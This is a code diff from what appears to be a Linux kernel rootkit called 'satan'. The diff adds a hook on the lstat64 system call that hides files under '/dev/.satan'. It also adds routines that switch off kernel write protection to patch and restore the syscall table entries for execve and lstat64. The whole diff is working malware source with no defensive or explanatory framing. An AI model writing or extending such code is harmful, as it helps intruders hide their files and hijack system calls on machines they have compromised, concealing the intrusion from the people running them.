@@ -21,11 +21,28 @@ asmlinkage int (*real_execve)(const char *filename,
                               char *const envp[]);
 
 asmlinkage int satan_execve(const char *filename,
-                          char *const argv[],
-                          char *const envp[])
+                            char *const argv[],
+                            char *const envp[])
 {
         pr_info("satan: hijacked execve(%s, ...)\n", filename);
         return real_execve(filename, argv, envp);
+}
+
+
+asmlinkage int (*real_lstat64)(const char *filename,
+                               struct stat64 *statbuf);
+
+asmlinkage long satan_lstat64(const char *filename,
+                              struct stat64 *statbuf)
+{
+        pr_info("satan: hijacked lstat64(%s, ...)\n", filename);
+
+        if (!strncmp(filename, "/dev/.satan", strlen("/dev/.satan"))) {
+                pr_alert("satan: hiding file: %s\n", filename);
+                return -ENOENT;
+        }
+
+        return real_lstat64(filename, statbuf);
 }
 
 
@@ -69,6 +86,7 @@ void satan_hijack_execve(void)
         } CR0_WP_DISABLE_END
 }
 
+
 void satan_restore_execve(void)
 {
         if (!found_sys_call_table || !hijacked) {
@@ -79,6 +97,33 @@ void satan_restore_execve(void)
 
         CR0_WP_DISABLE {
                 sys_call_table_ptr[__NR_execve] = (unsigned long *) real_execve;
-                pr_info("satan: restored sys_execve: %p\n", sys_call_table_ptr[__NR_execve]);
+                pr_info("satan: restored execve: %p\n", sys_call_table_ptr[__NR_execve]);
+        } CR0_WP_DISABLE_END
+}
+
+void satan_hijack_lstat64(void)
+{
+        if (!found_sys_call_table) {
+                return;
+        }
+
+        CR0_WP_DISABLE {
+                real_lstat64 = (void *) sys_call_table_ptr[__NR_lstat64];
+                pr_info("satan: original lstat64: %p\n", real_lstat64);
+
+                sys_call_table_ptr[__NR_lstat64] = (unsigned long *) satan_lstat64;
+                pr_info("satan: hijacked lstat64: %p\n", sys_call_table_ptr[__NR_lstat64]);
+        } CR0_WP_DISABLE_END
+}
+
+void satan_restore_lstat64(void)
+{
+        if (!found_sys_call_table) {
+                return;
+        }
+
+        CR0_WP_DISABLE {
+                sys_call_table_ptr[__NR_lstat64] = (unsigned long *) real_lstat64;
+                pr_info("satan: restored lstat64: %p\n", sys_call_table_ptr[__NR_lstat64]);
         } CR0_WP_DISABLE_END
 }
